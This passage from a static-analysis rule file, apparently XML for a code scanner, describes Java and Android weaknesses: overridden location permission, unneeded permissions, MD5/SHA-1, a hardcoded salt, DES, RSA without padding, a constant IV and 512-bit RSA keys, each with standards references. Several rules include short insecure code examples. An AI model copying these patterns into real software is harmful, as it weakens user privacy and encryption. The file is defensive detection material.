																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3500 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 265</em> <br></p>
																									   <p>[8] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>
																									   <p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.7, Requirement 7.2</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[12]  <em>Secure Coding Guidelines for the Java Programming Language, version 2.0</em> Sun Microsystems, Inc.<br></p>
																									   <p>[13] M. S. Ware <em>Writing secure Java code: taxonomy of heuristics and an evaluation of static analysis tools</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_privilege_management_overriding_permission_verification
		</key>
		<internalKey>Security Features/Privilege Management/Overriding
			Permission Verification
		</internalKey>
		<name>Privilege Management: Overriding Permission Verification</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Some functions may enable a programmer to be able to override the permissions specified by a user on an Android device at certain times.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Some functions may enable a programmer to specify an explicit value for whether permission was allowed. This can then be abused to violate what the user wants and still assume the permission was given.<br><br><b>Example 1: </b> The following code asks permission to use the user's location on Android while using WebView, yet uses the user's location whether or not permission to do so is granted. This is achieved by manually invoking the callback with <code>true</code> to specify that permission was given:<br><pre><br>public void onGeolocationPermissionsShowPrompt(String origin, GeolocationPermissions$Callback callback){<br>  super.onGeolocationPermissionsShowPrompt(origin, callback);<br>  callback.invoke(origin, true, false);<br>}<br></pre><br>    
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A2 Broken Access Control</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - FIPS200 - (FISMA) <em>AC</em> <br></p>
																									   <p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-6 Least Privilege (P1)</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3500 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3500 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3500 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3500 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3500 CAT II</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 265</em> <br></p>
																									   <p>[12]  <em>DRD15-J. Consider privacy concerns when using Geolocation API</em> CERT<br></p>
																									   <p>[13] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Improper Access Control - CWE ID 285</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 7.1.1</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 7.1.1</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 7.1.2</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_privilege_management_unnecessary_permission
		</key>
		<internalKey>Security Features/Privilege Management/Unnecessary
			Permission
		</internalKey>
		<name>Privilege Management: Unnecessary Permission</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The application fails to adhere to the principle of least privilege, which greatly amplifies the risk posed by other vulnerabilities.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  An application should only have the minimum permissions required for its proper execution. Extra permissions might deter users from installing the application.  This permission might be unnecessary for this program.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A2 Broken Access Control</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - FIPS200 - (FISMA) <em>AC</em> <br></p>
																									   <p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-6 Least Privilege (P1)</em> <br></p>
																									   <p>[6] A. P. Felt, E. Chin, S. Hanna, D. Song, and D. Wagner <em>Android Permissions Demystified</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3500 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3500 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3500 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3500 CAT II</em> <br></p>
																									   <p>[11] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3500 CAT II</em> <br></p>
																									   <p>[12] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 265</em> <br></p>
																									   <p>[13] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Improper Access Control - CWE ID 285</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 7.1.1</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 7.1.1</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 7.1.2</em> <br></p>
																									   <p>[19]  <em>Using Permissions</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_weak_cryptographic_hash</key>
		<internalKey>Security Features/Weak Cryptographic Hash</internalKey>
		<name>Weak Cryptographic Hash</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Weak cryptographic hashes cannot guarantee data integrity and should not be used in security-critical contexts.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  MD5 and SHA-1 are popular cryptographic hash algorithms often used to verify the integrity of messages and other data. Recent advances in cryptanalysis have discovered weaknesses in both algorithms. Consequently, MD5 and SHA-1 should no longer be relied upon to verify the authenticity of data in security-critical contexts.<br><br>Techniques for breaking MD5 hashes are advanced and widely available enough that the algorithm must not be relied upon for security. In the case of SHA-1, current techniques still require a significant amount of computational power and are more difficult to implement. However, attackers have found the Achilles' heel for the algorithm, and techniques for breaking it will likely lead to the discovery of even faster attacks.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A6 Sensitive Data Exposure</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A7 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A8 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A8 Insecure Storage</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3150.1 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3150.1 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3150.1 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3150.1 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3150.1 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 310</em> <br></p>
																									   <p>[11] Xiaoyun Wang, Yiqun Lisa Yin, and Hongbo Yu <em>Finding Collisions in the Full SHA-1</em> <br></p>
																									   <p>[12] Xiaoyun Wang and Hongbo Yu <em>How to Break MD5 and Other Hash Functions</em> <br></p>
																									   <p>[13] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M6 Broken Cryptography</em> <br></p>
																									   <p>[15] Stach & Liu <em>MD5 and MD4 Collision Generators</em> <br></p>
																									   <p>[16] Standards Mapping - FIPS200 - (FISMA) <em>MP</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.3, Requirement 6.5.8</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.3</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.3</em> <br></p>
																									   <p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[21] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-13 Cryptographic Protection (P1)</em> <br></p>
																									   <p>[22]  <em>SDL Development Practices</em> Microsoft<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_weak_cryptographic_hash_hardcoded_salt</key>
		<internalKey>Security Features/Weak Cryptographic Hash/Hardcoded Salt
		</internalKey>
		<name>Weak Cryptographic Hash: Hardcoded Salt</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  A hardcoded salt can compromise system security in a way that cannot be easily remedied.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  It is never a good idea to hardcode a salt. Not only does a hardcoded salt allow all of the project's developers to view the salt, it also makes fixing the problem extremely difficult. Once the code is in production, the salt cannot be easily changed. If attackers know the value of the salt, they can compute rainbow tables for the application and more easily reverse hashed values.<br><br><br><b>Example 1:</b> The following code uses a hardcoded salt:<br><pre><br>    ...<br>    Encryptor instance = ESAPI.encryptor();<br>    String hash1 = instance.hash(input, "HereComesTheSalt...");<br>    ...<br></pre><br><br>This code will run successfully, but anyone who has access to it will have access to the salt. Once the program has shipped, there is no going back from the salt "HereComesTheSalt...". A devious employee with access to this information can use it to break into the system. Even worse, if attackers have access to the bytecode for the application they can use the <code>javap -c</code> command to access the disassembled code, which will contain the values of the used salt.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A6 Sensitive Data Exposure</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A7 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A8 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A8 Insecure Storage</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3150.1 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3150.1 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3150.1 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3150.1 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3150.1 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 326</em> <br></p>
																									   <p>[11] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[12] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M6 Broken Cryptography</em> <br></p>
																									   <p>[13] Standards Mapping - FIPS200 - (FISMA) <em>MP</em> <br></p>
																									   <p>[14] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Porous Defenses - CWE ID 759</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.3, Requirement 6.5.8</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.3</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.3</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[19] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-13 Cryptographic Protection (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_weak_encryption</key>
		<internalKey>Security Features/Weak Encryption</internalKey>
		<name>Weak Encryption</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The program uses a weak encryption algorithm that cannot guarantee the confidentiality of sensitive data.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Antiquated encryption algorithms such as DES no longer provide sufficient protection for use with sensitive data. Encryption algorithms rely on key size as one of the primary mechanism to ensure cryptographic strength. Cryptographic strength is often measured by the time and computational power needed to generate a valid key. Advances in computing power have made it possible to obtain small encryption keys in a reasonable amount of time. For example, the 56-bit key used in DES posed a significant computational hurdle in the 1970's when the algorithm was first developed, but today DES can be cracked in less than a day using commonly available equipment.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A6 Sensitive Data Exposure</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A7 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A8 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A8 Insecure Storage</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3150.1 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3150.1 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3150.1 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3150.1 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3150.1 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 327</em> <br></p>
																									   <p>[11] distributed.net <em>DES</em> <br></p>
																									   <p>[12]  <em>FAQ About the Electronic Frontier Foundation's "DES Cracker" Machine</em> Electronic Frontier Foundation<br></p>
																									   <p>[13] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[14]  <em>Java Cryptography Architecture Standard Algorithm Name Documentation</em> Sun Microsystems<br></p>
																									   <p>[15] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M6 Broken Cryptography</em> <br></p>
																									   <p>[16]  <em>Microsoft Security Fundamentals</em> Microsoft<br></p>
																									   <p>[17] Standards Mapping - FIPS200 - (FISMA) <em>MP</em> <br></p>
																									   <p>[18]  <em>NIST Special Publication 800-132</em> NIST<br></p>
																									   <p>[19] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Porous Defenses - CWE ID 327</em> <br></p>
																									   <p>[20] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Porous Defenses - CWE ID 327</em> <br></p>
																									   <p>[21] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Porous Defenses - CWE ID 327</em> <br></p>
																									   <p>[22] John Kelsey, Bruce Schneier, and David Wagner <em>Related-key cryptanalysis of 3-WAY, Biham-DES, CAST, DES-X, NewDES, RC2, and TEA</em> <br></p>
																									   <p>[23] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.3, Requirement 6.5.8</em> <br></p>
																									   <p>[24] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.3</em> <br></p>
																									   <p>[25] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.3</em> <br></p>
																									   <p>[26] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[27] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-13 Cryptographic Protection (P1)</em> <br></p>
																									   <p>[28]  <em>SDL Development Practices</em> Microsoft<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_weak_encryption_inadequate_rsa_padding</key>
		<internalKey>Security Features/Weak Encryption/Inadequate RSA Padding
		</internalKey>
		<name>Weak Encryption: Inadequate RSA Padding</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The RSA algorithm is used without OAEP padding, thereby making the encryption weak.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  When used in practice, RSA is generally combined with some padding scheme. The goal of the padding scheme is to prevent a number of attacks that potentially work against RSA without padding.<br><br><b>Example 1:</b> The following code creates an RSA cipher without appropriate padding.<br><pre><br>  public Cipher getRSACipher() {<br>    Cipher rsa = null;<br>    try {<br>      rsa = javax.crypto.Cipher.getInstance("RSA/NONE/NoPadding");<br>    }<br>    catch (java.security.NoSuchAlgorithmException e) {<br>      log("this should never happen", e);<br>    }<br>    catch (javax.crypto.NoSuchPaddingException e) {<br>      log("this should never happen", e);<br>    }<br>    return rsa;<br>  }<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A6 Sensitive Data Exposure</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A7 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A8 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A8 Insecure Storage</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3150.1 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3150.1 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3150.1 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3150.1 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3150.1 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 325</em> <br></p>
																									   <p>[11] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[12] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M6 Broken Cryptography</em> <br></p>
																									   <p>[13] Standards Mapping - FIPS200 - (FISMA) <em>MP</em> <br></p>
																									   <p>[14]  <em>OPENSSL Documentation</em> <br></p>
																									   <p>[15]  <em>PKCS #1 v2.1: RSA Cryptography Standard</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.3, Requirement 6.5.8</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.3</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.3</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[20] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-13 Cryptographic Protection (P1)</em> <br></p>
																									   <p>[21]  <em>Wikipedia</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_weak_encryption_insecure_initial_value</key>
		<internalKey>Security Features/Weak Encryption/Insecure Initial Value
		</internalKey>
		<name>Weak Encryption: Insecure Initial Value</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  IvParameterSpec should not be constructed with a constant initialization vector argument.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  IvParameterSpec should not be constructed with a constant initialization vector argument.  Not using a random initialization Vector (IV) makes the resulting cipher text much more predictable and susceptible to a dictionary attack.<br><br><b>Example 1:</b> The following code creates an non-random initialization vector using hard-coded bytes.<br><br><pre><br>byte[] iv = { 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 };<br>IvParameterSpec ips = new IvParameterSpec(iv);<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A6 Sensitive Data Exposure</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A7 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A8 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A8 Insecure Storage</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3150.1 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3150.1 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3150.1 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3150.1 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3150.1 CAT II</em> <br></p>
																									   <p>[10] J. Viega, G. McGraw <em>Building Secure Software</em> Addison-Wesley<br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 310</em> <br></p>
																									   <p>[12] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[13]  <em>Java Cryptography Architecture</em> Sun Microsystems<br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M6 Broken Cryptography</em> <br></p>
																									   <p>[15] Standards Mapping - FIPS200 - (FISMA) <em>MP</em> <br></p>
																									   <p>[16]  <em>Not Using a Random IV with CBC Mode</em> CWE<br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 3.6.1, Requirement 6.3.1.3, Requirement 6.5.8</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 3.6.1, Requirement 6.5.3</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 3.6.1, Requirement 6.5.3</em> <br></p>
																									   <p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 3.6.1, Requirement 6.5.8</em> <br></p>
																									   <p>[21] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-12 Cryptographic Key Establishment and Management (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_weak_encryption_insufficient_key_size</key>
		<internalKey>Security Features/Weak Encryption/Insufficient Key Size
		</internalKey>
		<name>Weak Encryption: Insufficient Key Size</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  An otherwise strong encryption algorithm is vulnerable to brute force attack when a small key size is used.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Current cryptography guidelines suggest that key lengths of at least 1024 bits should be used with the RSA algorithm. However, increased computing power and advances in factoring techniques[1] are challenging the security of 1024 bit RSA encryption.<br><br><b>Example 1:</b> The following code generates a 512 bit RSA encryption key.<br><pre><br>  public static KeyPair getRSAKey() throws NoSuchAlgorithmException {<br>    KeyPairGenerator keyGen = KeyPairGenerator.getInstance("RSA");<br>    keyGen.initialize(512);<br><br>    KeyPair key = keyGen.generateKeyPair();<br>    return key;<br>  }<br></pre><br><br>When it comes to symmetric encryption, the key lengths should be at least 128 bits.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] J. Cheng <em>307-digit key crack endangers 1024-bit RSA</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A6 Sensitive Data Exposure</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A7 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A8 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[5] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A8 Insecure Storage</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3150.1 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3150.1 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3150.1 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3150.1 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3150.1 CAT II</em> <br></p>
																									   <p>[11]  <em>B. Chess and J. West, Secure Programming with Static Analysis. Boston, MA: Addison-Wesley, 2007.</em> <br></p>
																									   <p>[12]  <em>Cryptographic Algorithms and Key Sizes for Personal Identity Verification</em> NIST<br></p>
																									   <p>[13] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 310</em> <br></p>
																									   <p>[14] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[15] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M6 Broken Cryptography</em> <br></p>
